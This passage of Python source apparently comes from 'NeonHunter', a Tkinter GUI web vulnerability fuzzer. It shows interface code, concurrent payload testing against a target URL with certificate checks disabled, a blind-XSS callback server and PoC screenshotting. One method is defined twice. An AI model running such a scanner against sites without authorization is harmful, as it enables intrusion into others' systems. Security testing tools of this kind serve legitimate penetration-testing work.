                                        bg='#000000', font=('Consolas', 20))
        self.status_indicator.pack(side='left', padx=5)
        
        self.status_text_widget = tk.Label(self.status_frame, text="✅ READY", fg='#00ffff',
                                          bg='#000000', font=('Consolas', 12, 'bold'))
        self.status_text_widget.pack(side='left')
        
        # Animate status indicator
        self.animate_status_indicator()
        
    def animate_status_indicator(self):
        """Animate the status indicator"""
        if hasattr(self, 'status_indicator') and self.status_indicator:
            if self.is_running:
                if self.is_paused:
                    # Paused - orange pulse
                    color = '#ff6600'
                    alpha = abs(math.sin(time.time() * 2)) * 0.5 + 0.5
                    hex_alpha = f"{int(255*alpha):02x}"
                    self.status_indicator.config(fg=f'#{hex_alpha}6600')
                else:
                    # Running - green pulse
                    color = '#00ff00'
                    alpha = abs(math.sin(time.time() * 3)) * 0.5 + 0.5
                    hex_alpha = f"{int(255*alpha):02x}"
                    self.status_indicator.config(fg=f'#00{hex_alpha}00')
            else:
                # Ready - steady green
                self.status_indicator.config(fg='#00ff00')
                
        self.root.after(100, self.animate_status_indicator)
        
    def create_enhanced_log_area(self, parent):
        """Create enhanced log area with cyberpunk styling"""
        log_frame = tk.LabelFrame(parent, text="📝 SCAN LOGS", 
                                 font=('Consolas', 14, 'bold'),
                                 fg='#00ffcc', bg='#000000',
                                 labelanchor='n', bd=3, relief='ridge')
        log_frame.pack(fill='both', expand=True, padx=20, pady=(0, 15))
        
        # Log controls with cyberpunk styling
        log_controls = tk.Frame(log_frame, bg='#000000')
        log_controls.pack(fill='x', padx=10, pady=5)
        
        NeonIconButton(log_controls, text="Clear", icon="🧹", 
                      command=self.clear_logs, width=10).pack(side='left', padx=5)
        NeonIconButton(log_controls, text="Save", icon="💾", 
                      command=self.save_logs, width=10).pack(side='left', padx=5)
        NeonIconButton(log_controls, text="Copy", icon="📋", 
                      command=self.copy_logs, width=10).pack(side='left', padx=5)
        NeonIconButton(log_controls, text="Export", icon="📤", 
                      command=self.export_logs, width=10).pack(side='left', padx=5)
        NeonIconButton(log_controls, text="Monitor", icon="📡", 
                      command=self.open_live_monitor, width=12).pack(side='left', padx=5)
        
        # Search bar with neon styling
        search_frame = tk.Frame(log_controls, bg='#000000')
        search_frame.pack(side='right', padx=10)
        
        tk.Label(search_frame, text="🔍 Search:", fg='#ff00ff', bg='#000000',
                font=('Consolas', 10)).pack(side='left', padx=(0,5))
        
        self.log_search = tk.Entry(search_frame, width=30, bg='#111133', fg='#00ffcc',
                                  font=('Consolas', 10))
        self.log_search.pack(side='left', padx=5)
        
        NeonIconButton(search_frame, text="Find", 
                      command=self.search_logs, width=8).pack(side='left', padx=5)
        
        # Enhanced log text area with cyberpunk grid
        text_frame = tk.Frame(log_frame, bg='#000022')
        text_frame.pack(fill='both', expand=True, padx=10, pady=(0, 10))
        
        # Add grid overlay
        self.log_grid_canvas = tk.Canvas(text_frame, bg='#000022', highlightthickness=0)
        self.log_grid_canvas.place(relwidth=1, relheight=1)
        
        self.log_text = scrolledtext.ScrolledText(text_frame, bg='#000011', 
                                                 fg='#00ff41', font=('Consolas', 10),
                                                 insertbackground='#00ffff', 
                                                 relief='sunken', bd=3,
                                                 wrap='word')
        self.log_text.pack(fill='both', expand=True)
        
        # Configure tags for better visibility
        self.configure_log_tags()
        
        # Animate grid background
        self.animate_log_grid()
        
    def animate_log_grid(self):
        """Animate grid background for log area"""
        self.log_grid_canvas.delete("grid")
        w = self.log_grid_canvas.winfo_width()
        h = self.log_grid_canvas.winfo_height()
        
        if w < 20 or h < 20:
            self.root.after(100, self.animate_log_grid)
            return
            
        # Draw subtle grid
        for i in range(0, int(w), 100):
            alpha = 0.1 + abs(math.sin(time.time() + i/500)) * 0.05
            color = f"#00{int(255*alpha):02x}{int(255*alpha):02x}"
            self.log_grid_canvas.create_line(i, 0, i, h, fill=color, width=1, tags="grid")
            
        for i in range(0, int(h), 20):
            alpha = 0.1 + abs(math.cos(time.time() + i/500)) * 0.05
            color = f"#{int(255*alpha):02x}00{int(255*alpha):02x}"
            self.log_grid_canvas.create_line(0, i, w, i, fill=color, width=1, tags="grid")
            
        self.root.after(100, self.animate_log_grid)
        
    def configure_log_tags(self):
        """Configure text tags for log area"""
        tags = {
            'critical': {'foreground': '#ff0000', 'font': ('Consolas', 10, 'bold')},
            'high': {'foreground': '#ff6600', 'font': ('Consolas', 10, 'bold')},
            'medium': {'foreground': '#ffff00', 'font': ('Consolas', 10)},
            'low': {'foreground': '#00ff00', 'font': ('Consolas', 10)},
            'success': {'foreground': '#00ff88', 'font': ('Consolas', 10, 'bold')},
            'error': {'foreground': '#ff0000', 'font': ('Consolas', 10)},
            'warning': {'foreground': '#ffff00', 'font': ('Consolas', 10)},
            'info': {'foreground': '#00ccff', 'font': ('Consolas', 10)},
            'vulnerability': {'foreground': '#ff00ff', 'font': ('Consolas', 10, 'bold')},
            'scan_start': {'foreground': '#00ffff', 'font': ('Consolas', 10, 'bold')},
            'scan_end': {'foreground': '#00ff88', 'font': ('Consolas', 10, 'bold')},
            'highlight': {'background': '#223322', 'foreground': '#ffffff'},
        }
        
        for tag, config in tags.items():
            self.log_text.tag_config(tag, **config)
            
    def create_enhanced_footer(self, parent):
        """Create enhanced footer with animated elements"""
        footer_frame = tk.Frame(parent, bg='#000000', height=60)
        footer_frame.pack(side='bottom', fill='x')
        footer_frame.pack_propagate(False)
        
        # Left side - Stats with neon styling
        stats_frame = tk.Frame(footer_frame, bg='#000000')
        stats_frame.pack(side='left', padx=20)
        
        self.stats_display = tk.Label(stats_frame, 
                                     text="📊 Requests: 0 | 🔍 Findings: 0 | ⚠️ Critical: 0",
                                     font=('Consolas', 9), fg='#00ffcc', bg='#000000')
        self.stats_display.pack(pady=10)
        
        # Center - Animated neon line
        center_frame = tk.Frame(footer_frame, bg='#000000')
        center_frame.pack(expand=True, fill='both')
        
        self.footer_canvas = tk.Canvas(center_frame, bg='#000000', height=2, highlightthickness=0)
        self.footer_canvas.pack(fill='x', padx=20)
        self.animate_footer_line()
        
        # Right side - Author info with glow effect
        author_frame = tk.Frame(footer_frame, bg='#000000')
        author_frame.pack(side='right', padx=20)
        
        self.author_label = tk.Label(author_frame, 
                                    text="⚡ NEONHUNTER v3.5 | 👤 By Dickson Godwin Massawe | 💻 GitHub: dkhacker707",
                                    font=('Consolas', 9, 'bold'), fg='#ff00ff', bg='#000000')
        self.author_label.pack(pady=10)
        
        # Animate author label
        self.animate_author_label()
        
    def animate_footer_line(self):
        """Animate footer line"""
        self.footer_canvas.delete("line")
        w = self.footer_canvas.winfo_width()
        
        if w < 20:
            self.root.after(100, self.animate_footer_line)
            return
            
        # Create animated gradient line
        for i in range(0, w, 5):
            pos = (i + time.time() * 100) % w
            color = self.get_rainbow_color(pos/w)
            self.footer_canvas.create_line(i, 1, i+5, 1, fill=color, width=2, tags="line")
            
        self.root.after(50, self.animate_footer_line)
        
    def animate_author_label(self):
        """Animate author label with glow effect"""
        if hasattr(self, 'author_label') and self.author_label:
            alpha = abs(math.sin(time.time() * 1.5)) * 0.3 + 0.7
            color = f"#{int(255*alpha):02x}00{int(255*alpha):02x}"
            self.author_label.config(fg=color)
            
        self.root.after(100, self.animate_author_label)
        
    def get_rainbow_color(self, position):
        """Get rainbow color based on position"""
        r = int(255 * abs(math.sin(position * math.pi)))
        g = int(255 * abs(math.sin(position * math.pi + math.pi/2)))
        b = int(255 * abs(math.sin(position * math.pi + math.pi)))
        return f"#{r:02x}{g:02x}{b:02x}"
        
    def setup_enhanced_ui(self):
        """Setup enhanced UI components with pop-out panels"""
        # Left panel for quick actions
        self.left_panel = tk.Frame(self.root, bg='#111133', width=280)
        self.left_panel.pack(side='left', fill='y')
        self.left_panel.pack_propagate(False)
        
        self.setup_left_panel()
        
        # Right panel for live stats
        self.right_panel = tk.Frame(self.root, bg='#111133', width=300)
        self.right_panel.pack(side='right', fill='y')
        self.right_panel.pack_propagate(False)
        
        self.setup_right_panel()
        
    def setup_left_panel(self):
        """Setup left panel with quick actions"""
        # Panel header with animation
        header_frame = tk.Frame(self.left_panel, bg='#111133')
        header_frame.pack(fill='x', pady=(20, 10))
        
        tk.Label(header_frame, text="⚡ QUICK ACTIONS", fg='#00ffff', bg='#111133',
                font=('Consolas', 14, 'bold')).pack()
        
        # Animated underline
        underline = tk.Frame(header_frame, bg='#00ffff', height=2)
        underline.pack(fill='x', pady=(5, 0))
        
        # Quick actions buttons
        actions_frame = tk.Frame(self.left_panel, bg='#111133')
        actions_frame.pack(fill='both', expand=True, padx=10)
        
        quick_actions = [
            ("🔌 Test Connection", self.test_connection),
            ("📡 Open Monitor", self.open_live_monitor),
            ("📊 Open Dashboard", self.open_dashboard),
            ("📸 Screenshot", self.take_manual_screenshot),
            ("📋 Copy URL", self.copy_url),
            ("🧹 Clear All", self.clear_all),
            ("💾 Save Config", self.save_config),
            ("📥 Load Config", self.load_config),
            ("🔍 Header Analyzer", self.analyze_headers),
            ("🔐 SSL Checker", self.check_ssl),
            ("📖 Project Docs", self.show_project_docs),
            ("🎬 Tutorials", self.show_tutorials),
        ]
        
        for text, command in quick_actions:
            btn = NeonIconButton(actions_frame, text=text, command=command, 
                                width=24, color_scheme="secondary")
            btn.pack(pady=6)
            
        # Version info at bottom with glow effect
        version_frame = tk.Frame(self.left_panel, bg='#111133')
        version_frame.pack(side='bottom', pady=20)
        
        version_label = tk.Label(version_frame, text="v3.5", fg='#ff00ff', bg='#111133',
                                font=('Consolas', 24, 'bold'))
        version_label.pack()
        
        tk.Label(version_frame, text="PRO EDITION", fg='#00ff88', bg='#111133',
                font=('Consolas', 10)).pack()
                
        # Animate version label
        self.animate_version_label(version_label)
        
    def animate_version_label(self, label):
        """Animate version label with pulse effect"""
        if label.winfo_exists():
            alpha = abs(math.sin(time.time() * 2)) * 0.5 + 0.5
            color = f"#{int(255*alpha):02x}00{int(255*alpha):02x}"
            label.config(fg=color)
            self.root.after(100, lambda: self.animate_version_label(label))
            
    def setup_right_panel(self):
        """Setup right panel with live stats"""
        # Panel header
        header_frame = tk.Frame(self.right_panel, bg='#111133')
        header_frame.pack(fill='x', pady=(20, 10))
        
        tk.Label(header_frame, text="📈 LIVE STATS", fg='#00ffff', bg='#111133',
                font=('Consolas', 14, 'bold')).pack()
        
        # Stats display
        self.stats_frame = tk.Frame(self.right_panel, bg='#111133')
        self.stats_frame.pack(fill='both', expand=True, padx=20)
        
        self.create_stats_display()
        
        # Scan progress at bottom
        progress_frame = tk.Frame(self.right_panel, bg='#111133')
        progress_frame.pack(side='bottom', pady=20, padx=20, fill='x')
        
        tk.Label(progress_frame, text="📊 SCAN PROGRESS", fg='#ff00ff', bg='#111133',
                font=('Consolas', 11, 'bold')).pack(anchor='w')
        
        self.scan_progress = ttk.Progressbar(progress_frame, orient='horizontal',
                                           mode='determinate', length=200)
        self.scan_progress.pack(fill='x', pady=5)
        
        self.scan_progress_label = tk.Label(progress_frame, text="0%", fg='#00ffff',
                                          bg='#111133', font=('Consolas', 9))
        self.scan_progress_label.pack()
        
    def create_stats_display(self):
        """Create enhanced stats display with animations"""
        stats_data = [
            ("📊 Total Requests", "0", "#00ffff"),
            ("⚠️ Critical Findings", "0", "#ff0000"),
            ("🔍 Total Findings", "0", "#ff6600"),
            ("⏱️ Scan Duration", "0s", "#00ff88"),
            ("🚀 Speed", "0/s", "#ff00ff"),
            ("❌ Errors", "0", "#ffff00"),
            ("📈 Success Rate", "100%", "#00ffcc"),
            ("🎯 Targets", "0", "#cc00ff"),
            ("💾 Memory", "0 MB", "#00ffff"),
            ("⚡ CPU", "0%", "#ff00ff"),
        ]
        
        self.stat_labels = {}
        
        for label, value, color in stats_data:
            stat_frame = tk.Frame(self.stats_frame, bg='#111133')
            stat_frame.pack(fill='x', pady=6)
            
            # Label with icon
            label_widget = tk.Label(stat_frame, text=label, fg='#ffffff', bg='#111133',
                                  font=('Consolas', 10))
            label_widget.pack(side='left')
            
            # Value with animation
            val_label = tk.Label(stat_frame, text=value, fg=color, bg='#111133',
                               font=('Consolas', 10, 'bold'))
            val_label.pack(side='right')
            
            # Store reference for updates
            key = label.split()[1].lower()
            self.stat_labels[key] = val_label
            
            # Add hover effect
            stat_frame.bind('<Enter>', lambda e, f=stat_frame: f.config(bg='#222255'))
            stat_frame.bind('<Leave>', lambda e, f=stat_frame: f.config(bg='#111133'))
            
    # === ENHANCED METHODS ===
    
    def play_click_sound(self):
        try:
            winsound.Beep(1200, 80)
            winsound.Beep(1600, 40)
        except:
            pass

    def play_startup_sound(self):
        try:
            freqs = [800, 1000, 1200, 1600, 2000]
            for f in freqs:
                winsound.Beep(f, 80)
                time.sleep(0.05)
        except:
            pass

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        
        # Determine tag based on message content
        tag = 'info'
        if any(word in msg.lower() for word in ['error', 'failed']):
            tag = 'error'
        elif any(word in msg.lower() for word in ['warning']):
            tag = 'warning'
        elif any(word in msg.lower() for word in ['success']):
            tag = 'success'
        elif any(word in msg.lower() for word in ['critical']):
            tag = 'critical'
        elif any(word in msg.lower() for word in ['vulnerability', 'vuln']):
            tag = 'vulnerability'
        elif any(word in msg.lower() for word in ['started']):
            tag = 'scan_start'
        elif any(word in msg.lower() for word in ['complete', 'finished']):
            tag = 'scan_end'
            
        self.log_queue.put((f"[{ts}] {msg}\n", tag))
        
        # Also log to live monitor if open
        if hasattr(self, 'live_monitor') and self.live_monitor:
            self.live_monitor.add_log("LOG", msg)

    def process_queue(self):
        try:
            while not self.log_queue.empty():
                msg, tag = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, msg, tag)
                self.log_text.see(tk.END)
        except pyqueue.Empty:
            pass
        self.root.after(100, self.process_queue)

    def start_advanced_features(self):
        """Start advanced features after UI is fully initialized"""
        # Initialize stat_labels dictionary if not already done
        if not hasattr(self, 'stat_labels'):
            self.stat_labels = {}
        
        self.update_stats_display()
        
        if self.auto_save_var.get():
            threading.Thread(target=self.auto_save_worker, daemon=True).start()
            
        # Start system monitor
        self.start_system_monitor()

    def start_system_monitor(self):
        """Start monitoring system resources"""
        try:
            # Try to import psutil, but handle if it's not installed
            import psutil
            
            def monitor():
                while True:
                    try:
                        # Get system stats
                        memory = psutil.virtual_memory()
                        cpu = psutil.cpu_percent(interval=1)
                        
                        # Update UI
                        self.root.after(0, lambda: self.update_system_stats(memory, cpu))
                        
                        time.sleep(2)
                    except:
                        pass
                        
            threading.Thread(target=monitor, daemon=True).start()
            
        except ImportError:
            self.log("⚠️ psutil not installed. System monitoring disabled.")
            self.log("💡 Install with: pip install psutil")
        
    def update_system_stats(self, memory, cpu):
        """Update system statistics display"""
        if hasattr(self, 'stat_labels'):
            if 'memory' in self.stat_labels:
                mem_text = f"{memory.used // 1024 // 1024} MB"
                self.stat_labels['memory'].config(text=mem_text)
                
            if 'cpu' in self.stat_labels:
                cpu_text = f"{cpu:.1f}%"
                self.stat_labels['cpu'].config(text=cpu_text)
                
    def update_stats_display(self):
        """Update all statistics displays"""
        # Update main stats display
        if hasattr(self, 'stats_display') and self.stats_display:
            stats_text = f"📊 Requests: {self.stats['requests_sent']} | "
            stats_text += f"🔍 Findings: {len(self.results)} | "
            stats_text += f"⚠️ Critical: {self.stats['critical_findings']} | "
            stats_text += f"🚀 Speed: {self.stats.get('payloads_per_second', 0):.1f}/s"
            self.stats_display.config(text=stats_text)
            
        # Update right panel stats (only if stat_labels exists)
        if hasattr(self, 'stat_labels') and self.stat_labels:
            # Safely update each stat label
            stat_mapping = {
                'requests': str(self.stats['requests_sent']),
                'critical': str(self.stats['critical_findings']),
                'findings': str(len(self.results)),
                'errors': str(self.stats['errors']),
                'duration': self.stats.get('scan_duration', '0s'),
                'speed': f"{self.stats.get('payloads_per_second', 0):.1f}/s"
            }
            
            for key, value in stat_mapping.items():
                if key in self.stat_labels:
                    self.stat_labels[key].config(text=value)
            
            # Calculate success rate
            if 'rate' in self.stat_labels and self.stats['requests_sent'] > 0:
                success_rate = ((self.stats['requests_sent'] - self.stats['errors']) / 
                               self.stats['requests_sent'] * 100)
                self.stat_labels['rate'].config(text=f"{success_rate:.1f}%")
                
        # Update dashboard if open
        if hasattr(self, 'dashboard') and self.dashboard and self.dashboard.window.winfo_exists():
            self.update_dashboard_stats()
            
        # Update status text
        if hasattr(self, 'status_text_widget') and self.status_text_widget:
            if self.is_running:
                if self.is_paused:
                    status = "⏸️ PAUSED"
                    color = '#ff6600'
                else:
                    status = "🚀 RUNNING"
                    color = '#ffff00'
            else:
                status = "✅ READY"
                color = '#00ff00'
                
            self.status_text_widget.config(text=status, fg=color)
            
        self.root.after(1000, self.update_stats_display)
        
    def update_dashboard_stats(self):
        """Update dashboard statistics"""
        if not hasattr(self, 'dashboard') or not self.dashboard:
            return
            
        # Update performance metrics
        if hasattr(self.dashboard, 'perf_requests'):
            self.dashboard.perf_requests.config(text=f"{self.stats.get('payloads_per_second', 0):.1f}")
            
        # Update vulnerability stats
        if hasattr(self.dashboard, 'vuln_critical'):
            self.dashboard.vuln_critical.config(text=str(self.stats['critical_findings']))
            
        # Update network stats
        if hasattr(self.dashboard, 'net_total'):
            self.dashboard.net_total.config(text=str(self.stats['requests_sent']))
            
    def start_direct_fuzz(self):
        try:
            self.play_click_sound()
            target = self.target_entry.get().strip()
            
            if not target:
                self.show_popup("Error", "Please enter a target URL", "error")
                return
                
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
                
            try:
                urlparse(target)
            except:
                self.show_popup("Error", "Invalid URL format", "error")
                return
                
            self.scan_start_time = datetime.now()
            self.total_payloads_tested = 0
            self.vuln_counter = 0
            self.results = []
            
            self.stop_event.clear()
            self.is_running = True
            self.is_paused = False
            self.fuzz_btn.config(state='disabled')
            self.pause_btn.config(state='normal', text="⏯️ PAUSE")
            self.stop_btn.config(state='normal')
            
            # Open monitor windows
            self.open_dashboard()
            self.open_live_monitor()
            
            self.progress.start(10)
            
            # Initialize payloads if not already done
            self.initialize_payloads()
            
            self.fuzz_thread = threading.Thread(
                target=self.advanced_direct_fuzz,
                args=(target,),
                daemon=True
            )
            self.fuzz_thread.start()
            
            self.log(f"🚀 ADVANCED FUZZING STARTED: {target}")
            self.log(f"⚙️ Threads: {self.concurrent_requests.get()}")
            self.log(f"⏱️ Timeout: {self.timeout_var.get()}s")
            
            # Show notification
            self.show_popup("Scan Started", f"Fuzzing started for:\n{target}", "info")
            
        except Exception as e:
            self.log(f"❌ Error starting scan: {e}")
            self.show_popup("Error", f"Failed to start scan:\n{e}", "error")
            
    def show_popup(self, title, message, type="info"):
        """Show enhanced popup notification"""
        colors = {
            "info": {"bg": "#003366", "fg": "#00ffff", "icon": "ℹ️"},
            "error": {"bg": "#660000", "fg": "#ff4444", "icon": "❌"},
            "warning": {"bg": "#663300", "fg": "#ffff00", "icon": "⚠️"},
            "success": {"bg": "#006600", "fg": "#00ff88", "icon": "✅"},
        }
        
        config = colors.get(type, colors["info"])
        
        popup = tk.Toplevel(self.root)
        popup.title(title)
        popup.configure(bg=config['bg'])
        popup.geometry("400x200")
        popup.attributes('-topmost', True)
        
        # Center the popup
        popup.update_idletasks()
        x = self.root.winfo_x() + (self.root.winfo_width() - popup.winfo_width()) // 2
        y = self.root.winfo_y() + (self.root.winfo_height() - popup.winfo_height()) // 2
        popup.geometry(f"+{x}+{y}")
        
        # Add close button
        def close_popup():
            popup.destroy()
            
        popup.bind('<Escape>', lambda e: close_popup())
        popup.protocol("WM_DELETE_WINDOW", close_popup)
        
        # Content
        tk.Label(popup, text=f"{config['icon']} {title}", 
                font=('Consolas', 16, 'bold'),
                fg=config['fg'], bg=config['bg']).pack(pady=20)
                
        tk.Label(popup, text=message, 
                font=('Consolas', 11),
                fg='#ffffff', bg=config['bg'],
                wraplength=350).pack(pady=10, padx=20)
                
        NeonIconButton(popup, text="Close", 
                      command=close_popup, 
                      color_scheme="primary",
                      width=15).pack(pady=20)
                      
        # Auto-close after 5 seconds for non-error messages
        if type != "error":
            popup.after(5000, close_popup)
            
    def advanced_direct_fuzz(self, base_url):
        """Enhanced fuzzing with concurrency"""
        self.stats['start_time'] = datetime.now()
        self.stats['requests_sent'] = 0
        self.stats['errors'] = 0
        self.stats['critical_findings'] = 0
        
        parsed = urlparse(base_url)
        params = self.discover_parameters(base_url)
        
        if not params:
            params = self.get_common_parameters()
            
        tasks = []
        for param in params:
            for vuln_type, enabled in self.vulns.items():
                if enabled.get() and not self.stop_event.is_set():
                    for payload in self.payloads.get(vuln_type, []):
                        tasks.append((param, vuln_type, payload))
                        
        self.log(f"🚀 Starting advanced fuzz with {len(tasks)} tasks...")
        
        total_tasks = len(tasks)
        completed_tasks = 0
        
        with ThreadPoolExecutor(max_workers=self.concurrent_requests.get()) as executor:
            futures = []
            for param, vuln_type, payload in tasks:
                if self.stop_event.is_set():
                    break
                    
                future = executor.submit(
                    self.test_payload_concurrent,
                    base_url, param, vuln_type, payload
                )
                futures.append(future)
                
            for future in as_completed(futures):
                if self.stop_event.is_set():
                    break
                    
                completed_tasks += 1
                
                # Update progress
                progress = (completed_tasks / total_tasks) * 100
                self.root.after(0, lambda p=progress: self.update_progress(p))
                
                try:
                    result = future.result(timeout=self.timeout_var.get())
                    if result:
                        self.process_vulnerability_result(result)
                except Exception as e:
                    self.stats['errors'] += 1
                    self.log(f"❌ Task error: {e}")
                    
        self.advanced_scan_complete()
        
    def update_progress(self, progress):
        """Update progress bar"""
        if hasattr(self, 'scan_progress'):
            self.scan_progress['value'] = progress
            self.scan_progress_label.config(text=f"{progress:.1f}%")
            
        if hasattr(self, 'progress_label'):
            self.progress_label.config(text=f"{progress:.1f}%")
            
    def test_payload_concurrent(self, base_url, param, vuln_type, payload):
        """Test a single payload concurrently"""
        if self.stop_event.is_set():
            return None
            
        if self.rate_limit_var.get():
            time.sleep(self.delay_var.get() / self.concurrent_requests.get())
            
        while self.is_paused and not self.stop_event.is_set():
            time.sleep(0.1)
            
        session = self.get_session()
        test_url = self.build_test_url(base_url, param, payload)
        
        try:
            self.stats['requests_sent'] += 1
            start_time = time.time()
            
            # Log to live monitor
            if hasattr(self, 'live_monitor') and self.live_monitor:
                self.live_monitor.add_log('GET', test_url)
                
            response = session.get(
                test_url,
                timeout=self.timeout_var.get(),
                allow_redirects=True,
                verify=False
            )
            
            response_time = (time.time() - start_time) * 1000
            
            # Log response to live monitor
            if hasattr(self, 'live_monitor') and self.live_monitor:
                self.live_monitor.add_log('GET', test_url, response.status_code, response_time)
                
            detection_result = self.advanced_detection(
                vuln_type, payload, response, test_url
            )
            
            if detection_result['vulnerable']:
                return {
                    'vuln_type': vuln_type,
                    'param': param,
                    'payload': payload,
                    'url': test_url,
                    'response': response,
                    'evidence': detection_result['evidence']
                }
                
        except Exception as e:
            if hasattr(self, 'live_monitor') and self.live_monitor:
                self.live_monitor.add_log('GET', test_url, 'ERROR')
            self.stats['errors'] += 1
            
        return None
        
    def get_session(self):
        proxy = self.proxy_entry.get().strip()
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        s = requests.Session()
        s.headers.update({'User-Agent': 'NeonHunter v3.5'})
        if proxies:
            s.proxies.update(proxies)
        return s
        
    def toggle_pause(self):
        self.play_click_sound()
        if self.is_paused:
            self.is_paused = False
            self.pause_btn.config(text="⏯️ PAUSE")
            self.log("▶️ Fuzzing resumed")
            if hasattr(self, 'status_text_widget') and self.status_text_widget:
                self.status_text_widget.config(text="🚀 RUNNING", fg='#ffff00')
        else:
            self.is_paused = True
            self.pause_btn.config(text="▶️ RESUME")
            self.log("⏸️ Fuzzing paused")
            if hasattr(self, 'status_text_widget') and self.status_text_widget:
                self.status_text_widget.config(text="⏸️ PAUSED", fg='#ff6600')
                
    def stop_fuzz(self):
        self.play_click_sound()
        self.stop_event.set()
        self.is_running = False
        self.is_paused = False
        self.progress.stop()
        self.fuzz_btn.config(state='normal')
        self.pause_btn.config(state='disabled')
        self.stop_btn.config(state='disabled')
        self.log("⏹️ Fuzzing stopped by user - monitors remain open")
        if hasattr(self, 'status_text_widget') and self.status_text_widget:
            self.status_text_widget.config(text="✅ READY", fg='#00ff00')
            
    def start_blind_server(self):
        self.play_click_sound()
        if self.blind_server:
            self.log("🎯 Blind server already running")
            return
        threading.Thread(target=self.run_blind_server, daemon=True).start()
        self.log(f"🎯 Blind server started -> http://{self.callback_ip}:8000")
        
    def run_blind_server(self):
        global app
        app = self
        self.blind_server = HTTPServer(('0.0.0.0', 8000), BlindCallbackHandler)
        self.blind_server.serve_forever()
        
    def take_screenshot(self, url, poc_num):
        """Take screenshot with error handling"""
        try:
            if not url or not url.startswith(('http://', 'https://')):
                self.log(f"❌ Invalid URL for screenshot: {url}")
                return None
                
            # Run in separate thread
            def screenshot_worker():
                try:
                    options = Options()
                    options.add_argument("--headless")
                    options.add_argument("--no-sandbox")
                    options.add_argument("--disable-dev-shm-usage")
                    options.add_argument("--disable-gpu")
                    options.add_argument("--window-size=1920,1080")
                    
                    service = ChromeService(ChromeDriverManager().install())
                    driver = webdriver.Chrome(service=service, options=options)
                    
                    driver.get(url)
                    time.sleep(3)
                    
                    os.makedirs("screenshots", exist_ok=True)
                    filename = f"PoC_{poc_num}_{int(time.time())}.png"
                    path = f"screenshots/{filename}"
                    
                    driver.save_screenshot(path)
                    driver.quit()
                    
                    self.root.after(0, lambda: self.log(f"📸 Screenshot saved: {filename}"))
                    return path
                    
                except Exception as e:
                    self.root.after(0, lambda: self.log(f"❌ Screenshot failed: {str(e)[:100]}"))
                    return None
            
            # Start thread and return immediately
            thread = threading.Thread(target=screenshot_worker, daemon=True)
            thread.start()
            
            # Return placeholder path
            return f"screenshots/PoC_{poc_num}.png"
            
        except Exception as e:
            self.log(f"❌ Screenshot setup failed: {e}")
            return None
    
            
    def take_manual_screenshot(self):
        """Take manual screenshot of current target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("Error", "Enter target URL first")
            return
        
        # Run in background thread to avoid UI freeze
        def screenshot_thread():
            screenshot_path = self.take_screenshot(target, f"manual_{int(time.time())}")
            if screenshot_path and os.path.exists(screenshot_path.replace('.png', f'_{int(time.time())}.png')):
                self.root.after(0, lambda: messagebox.showinfo("📸 Screenshot", 
                                                              f"Screenshot saved:\n{screenshot_path}"))
        
    def take_manual_screenshot(self):
        """Take manual screenshot of current target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showwarning("Error", "Enter target URL first")
            return
        
        # Run in background thread to avoid UI freeze
        def screenshot_thread():
            screenshot_path = self.take_screenshot(target, f"manual_{int(time.time())}")
            if screenshot_path and os.path.exists(screenshot_path.replace('.png', f'_{int(time.time())}.png')):
                self.root.after(0, lambda: messagebox.showinfo("📸 Screenshot", 
                                                              f"Screenshot saved:\n{screenshot_path}"))
        
        threading.Thread(target=screenshot_thread, daemon=True).start()
        self.log("📸 Taking screenshot...")
            
    def show_project_docs(self):
        """Show enhanced project documentation"""
        docs_text = """
📚 NEONHUNTER PROJECT DOCUMENTATION
====================================

🎯 PROJECT OVERVIEW:
NeonHunter is an advanced web vulnerability scanner designed for
bug bounty hunters, penetration testers, and security researchers.

⚡ KEY FEATURES:
• 10+ vulnerability types detection
• Concurrent scanning (multi-threaded)
• Batch processing for multiple targets
• Custom payload generator
• Professional HTML reporting
• Blind XSS server integration
• Session management
• Real-time monitoring

🔧 TECHNICAL SPECIFICATIONS:
• Language: Python 3.8+
• GUI Framework: Tkinter
• Dependencies: requests, beautifulsoup4, selenium
• Concurrency: ThreadPoolExecutor
• Reporting: HTML, CSV, JSON

📁 PROJECT STRUCTURE:
neonhunter/
├── main.py              # Main application
├── requirements.txt     # Dependencies
├── screenshots/         # Proof of Concept images
├── reports/            # Generated reports
├── logs/               # Scan logs
└── config/             # Configuration files

🚀 GETTING STARTED:
1. Install dependencies: pip install -r requirements.txt
2. Run: python main.py
3. Enter target URL and select vulnerabilities
4. Click START FUZZING

📖 USAGE GUIDE:
• Single Target: Enter URL and scan
• Batch Scanning: Load targets from file
• Custom Payloads: Import your own payloads
• Reporting: Generate professional reports

🔒 SECURITY NOTES:
• Use only on authorized targets
• Respect robots.txt
• Follow ethical hacking guidelines
• Get proper authorization

📞 SUPPORT:
• GitHub: https://github.com/dkhacker707
• Issues: GitHub Issues page
• Email: Contact via GitHub

🎯 ROADMAP:
• Add API testing
• Integrate with Burp Suite
• Add more vulnerability checks
• Improve performance
• Add more reporting formats

📄 LICENSE:
MIT License - Free for educational and authorized use

👨‍💻 DEVELOPER:
Dickson Godwin Massawe
GitHub: @dkhacker707
        """
        
        self.show_info_window("📖 Project Documentation", docs_text)
        
    def show_info_window(self, title, text, width=70, height=30):
        """Show information in a scrollable window"""
        window = tk.Toplevel(self.root)
        window.title(title)
        window.configure(bg='#000000')
        window.geometry("800x600")
        
        # Title
        tk.Label(window, text=title, fg='#00ffff', bg='#000000',
                font=('Consolas', 16, 'bold')).pack(pady=10)
        
        # Scrollable text
        text_frame = tk.Frame(window, bg='#000000')
        text_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        scrollbar = tk.Scrollbar(text_frame)
        scrollbar.pack(side='right', fill='y')
        
        text_widget = tk.Text(text_frame, wrap='word', bg='#111133', fg='#00ffcc',
                             font=('Consolas', 10), yscrollcommand=scrollbar.set,
                             padx=10, pady=10)
        text_widget.pack(fill='both', expand=True)
        
        scrollbar.config(command=text_widget.yview)
        
        # Insert text
        text_widget.insert('1.0', text)
        text_widget.config(state='disabled')
        
        # Close button
        NeonIconButton(window, text="Close", icon="❌", 
